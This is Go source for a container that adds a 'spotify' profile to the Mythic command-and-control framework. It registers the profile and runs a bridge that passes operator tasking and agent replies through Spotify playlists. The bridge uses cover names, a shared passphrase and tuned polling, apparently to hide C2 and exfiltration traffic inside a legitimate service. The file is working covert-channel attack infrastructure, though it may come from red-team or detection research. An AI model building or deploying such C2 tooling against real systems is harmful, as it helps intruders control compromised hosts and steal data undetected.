// spotifycontainer is the Mythic C2 profile container for the "spotify"
// profile. It registers the profile with Mythic and runs the pump that
// bridges Mythic tasking to the Spotify-playlist transport.
//
// Runtime configuration comes from environment variables (Mythic does not
// push C2 profile parameters into the container):
//
//	SPOTIFY_USERNAME / SPOTIFY_CLIENT_ID / SPOTIFY_CLIENT_SECRET
//	SPOTIFY_REDIRECTURI            (default http://127.0.0.1:8888/callback)
//	SPOTIFY_TOKEN_FILE             (spotipy-format token cache; headless auth)
//	SPOTEXFIL_PASSPHRASE           (transport passphrase, must match agent build)
//	SPOTEXFIL_POLL_INTERVAL        (seconds, default 30, minimum 20)
//	SPOTEXFIL_POLL_FALLBACK=1      (use HTTP POST relay instead of gRPC push)
//	MYTHIC_ADDRESS                 (base URL for the poll fallback)
//
// The parameters declared in c2functions are what operators set in the
// Mythic UI at payload-build time; keep the env vars above in sync with the
// active payload's parameters.
package main

import (
	"context"
	"log"
	"os"
	"os/signal"
	"strconv"
	"syscall"
	"time"

	MythicContainer "github.com/MythicMeta/MythicContainer"
	c2structs "github.com/MythicMeta/MythicContainer/c2_structs"

	sfspotify "github.com/sourcefrenchy/spotexfil/pkg/spotify"

	"spotifycontainer/spotify"
	"spotifycontainer/spotify/c2functions"
	"spotifycontainer/spotify/pump"
)

func main() {
	initialize()
	MythicContainer.StartAndRunForever([]MythicContainer.MythicServices{
		MythicContainer.MythicServiceC2,
	})
}

// initialize registers the profile definition and parameters with Mythic
// and starts the bridge pump in the background.
func initialize() {
	def := c2functions.Definition()
	c2structs.AllC2Data.Get(def.Name).AddC2Definition(def)
	c2structs.AllC2Data.Get(def.Name).AddParameters(c2functions.Parameters())

	p, err := buildPump(def.Name)
	if err != nil {
		// The profile must still register and run so Mythic can use it for
		// payload builds/config checks; the bridge just won't move traffic.
		log.Printf("[!] bridge disabled: %v", err)
		return
	}

	ctx, cancel := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	go func() {
		defer cancel()
		for {
			if err := p.RunMythicToAgent(ctx); err != nil && ctx.Err() == nil {
				log.Printf("[!] Mythic->agent loop exited, restarting: %v", err)
				time.Sleep(5 * time.Second)
				continue
			}
			return
		}
	}()
	go func() {
		if err := p.RunAgentToMythic(ctx); err != nil {
			log.Printf("[!] agent->Mythic loop exited: %v", err)
		}
	}()
	log.Printf("[*] spotify bridge started (poll %s)", pollInterval())
}

// buildPump constructs the real pump from environment configuration.
func buildPump(profileName string) (*pump.Pump, error) {
	cfg, err := sfspotify.LoadConfig()
	if err != nil {
		return nil, err
	}
	tokenFile := os.Getenv("SPOTIFY_TOKEN_FILE")
	client, err := sfspotify.NewClientWithOptions(cfg, sfspotify.ClientOptions{
		UseCoverNames: true,
		AllowOAuth:    false, // headless container: pre-stage a token
		PersistToken:  tokenFile == "",
		TokenFile:     tokenFile,
	})
	if err != nil {
		return nil, err
	}

	passphrase := os.Getenv("SPOTEXFIL_PASSPHRASE")
	if passphrase == "" {
		return nil, errMissing("SPOTEXFIL_PASSPHRASE")
	}
	transport := spotify.NewPlaylistTransport(client, passphrase)

	var mythicSide pump.MythicSide
	ctx := context.Background()
	if os.Getenv("SPOTEXFIL_POLL_FALLBACK") == "1" {
		addr := os.Getenv("MYTHIC_ADDRESS")
		if addr == "" {
			return nil, errMissing("MYTHIC_ADDRESS")
		}
		mythicSide = spotify.NewPollMythic(addr, profileName)
		log.Printf("[*] using poll-style HTTP relay to %s", addr)
	} else {
		m, err := spotify.NewGRPCMythic(ctx, profileName)
		if err != nil {
			return nil, err
		}
		mythicSide = m
		log.Printf("[*] using gRPC push-C2 stream to Mythic")
	}

	return pump.New(mythicSide, transport, pump.Config{
		PollInterval: pollInterval(),
	})
}

func pollInterval() time.Duration {
	const def = 30 * time.Second
	v := os.Getenv("SPOTEXFIL_POLL_INTERVAL")
	if v == "" {
		return def
	}
	n, err := strconv.Atoi(v)
	if err != nil || n < 20 {
		log.Printf("[!] invalid SPOTEXFIL_POLL_INTERVAL %q, using %s", v, def)
		return def
	}
	return time.Duration(n) * time.Second
}

type missingEnv string

func errMissing(name string) error { return missingEnv(name) }
func (e missingEnv) Error() string {
	return "required environment variable " + string(e) + " is not set"
}
